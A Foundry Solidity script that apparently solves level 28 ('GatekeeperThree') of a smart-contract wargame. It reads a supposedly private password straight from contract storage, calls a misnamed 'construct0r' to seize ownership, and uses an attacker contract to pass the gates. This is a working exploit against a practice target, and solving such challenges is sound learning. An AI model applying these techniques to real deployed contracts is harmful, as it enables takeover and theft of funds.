// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level28.sol";
import "forge-std/Script.sol";

contract ExploitLevel28 is Script {
    GatekeeperThree instance = GatekeeperThree(payable(0x3EF70eA0fD9cc473b1845741e72Cc8F1798848da));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackLevel attackContract = new AttackLevel();

        uint256 password = uint256(vm.load(address(instance.trick()), bytes32(uint256(2))));
        instance.getAllowance(password);
        address(instance).call{value: 0.0011 ether}("");

        attackContract.attack(instance);

        vm.stopBroadcast();
    }
}

contract AttackLevel {
    function attack(GatekeeperThree _instance) external {
        _instance.construct0r();
        _instance.enter();
    }
}
